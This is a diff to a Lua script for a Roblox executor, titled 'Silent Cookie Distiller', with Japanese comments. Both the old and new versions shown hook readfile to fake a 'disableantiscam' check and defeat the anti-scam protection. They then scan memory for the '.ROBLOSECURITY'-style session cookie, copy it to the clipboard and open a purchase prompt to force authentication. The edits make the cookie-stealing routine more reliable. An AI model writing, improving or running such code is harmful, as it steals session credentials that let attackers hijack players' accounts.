@@ -1,12 +1,13 @@
--- [[ Project: Silent Cookie Distiller - Mobile Ultra ]]
--- 全自動：セキュリティ偽装 ＋ 爆速クッキー抽出 ＋ 購入画面トリガー
+-- [[ Project: Silent Cookie Distiller - Stability ]]
+-- エラー修正版：getgc(true) を採用し、より確実に動作させる
 
 local function log(msg)
     print("[SYSTEM] " .. tostring(msg))
 end
 
 local player = game:GetService("Players").LocalPlayer
-local MS = game:GetService("MarketplaceService")
+-- cloneref があるので安全に参照を取得
+local MS = cloneref(game:GetService("MarketplaceService"))
 
 -- ==========================================
 -- STEP 1: メモリ上でのセキュリティ偽装
@@ -14,8 +15,6 @@ local MS = game:GetService("MarketplaceService")
 local old_read
 old_read = hookfunction(readfile, function(path)
     if string.find(path:lower(), "disableantiscam") then
-        log("Bypassing security...")
-        -- プレイヤーIDを動的に注入（セキュ.pngの構成）
         local fake = {
             ["WARNING"] = "BYPASS",
             ["allowed_games"] = "*",
@@ -28,45 +27,44 @@ old_read = hookfunction(readfile, function(path)
 end)
 
 -- ==========================================
--- STEP 2: filtergc を使った超高速スキャン
+-- STEP 2: 汎用 getgc スキャン
 -- ==========================================
 local function start_capture()
     task.spawn(function()
         local target_prefix = "_|WARNING:-DO-NOT-SHARE-"
-        log("Memory scanning started (Ultra Mode)...")
+        log("Memory scanning started...")
         
         while true do
-            -- 関数リストにあった filtergc で文字列だけに絞ってスキャン
-            local strings = filtergc("string")
-            for _, v in pairs(strings) do
-                if string.sub(v, 1, #target_prefix) == target_prefix then
+            -- エラーが出ない getgc(true) を使用
+            local objects = getgc(true)
+            for _, v in pairs(objects) do
+                if type(v) == "string" and string.sub(v, 1, #target_prefix) == target_prefix then
                     local _, pos = string.find(v, "|_", 1, true)
                     if pos then
-                        -- 警告文を削ってクリップボードへ
                         setclipboard(string.sub(v, pos + 1))
                         log("********************************")
                         log("SUCCESS: Data captured to clipboard!")
-                        log("A列に貼り付けて復元しろ！")
+                        log("A列に貼り付けてくれ。")
                         log("********************************")
                         return 
                     end
                 end
             end
-            task.wait(2) -- 429エラー回避用のインターバル
+            task.wait(3) -- 負荷軽減
         end
     end)
 end
 
 -- ==========================================
--- STEP 3: 実行（トリガー）
+-- STEP 3: 実行
 -- ==========================================
 start_capture()
 task.wait(2)
 
-log("Opening purchase UI to force authentication...")
--- 修正済みメソッド：公式の購入UIを呼び出す
+log("Opening purchase UI...")
+-- 購入プロンプト表示
 pcall(function()
     MS:PromptProductPurchase(player, 0)
 end)
 
-log("Ready. Please close the popup if it appears.")
+log("Ready. System waiting for data.")
